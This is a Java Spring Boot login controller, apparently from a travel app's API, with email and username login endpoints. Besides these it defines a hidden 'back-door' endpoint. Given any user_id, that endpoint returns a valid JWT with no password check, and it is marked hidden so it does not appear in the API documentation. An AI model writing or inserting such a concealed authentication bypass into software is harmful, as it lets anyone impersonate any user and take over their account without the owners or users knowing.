package com.traveloveapi.controller.auth.login;

import com.traveloveapi.DTO.TokenResponse;
import com.traveloveapi.DTO.login.EmailLoginRequest;
import com.traveloveapi.DTO.login.UsernameLoginRequest;
import com.traveloveapi.constrain.Role;
import com.traveloveapi.service.login.LoginService;
import com.traveloveapi.utility.JwtProvider;
import io.swagger.v3.oas.annotations.Operation;
import io.swagger.v3.oas.annotations.tags.Tag;
import lombok.RequiredArgsConstructor;
import org.springframework.web.bind.annotation.*;

@RestController
@RequiredArgsConstructor
@RequestMapping("/auth/login")
public class LoginController {
    final private LoginService loginService;

    @Tag(name = "SPRINT 1")
    @PostMapping("/email")
    public TokenResponse emailLogin(@RequestBody EmailLoginRequest request) {
        return loginService.emailLogin(request.getEmail(),request.getPassword());
    }

    @Tag(name = "SPRINT 1")
    @PostMapping("/username")
    public TokenResponse usernameLogin(@RequestBody UsernameLoginRequest request) {
        return loginService.usernameLogin(request.getUsername(),request.getPassword());
    }

    @PostMapping("/back-door")
    @Operation(hidden = true)
    public TokenResponse backDoorLogin(@RequestParam String user_id) {
        return JwtProvider.generateTokenResponse(user_id, Role.USER);
    }
}
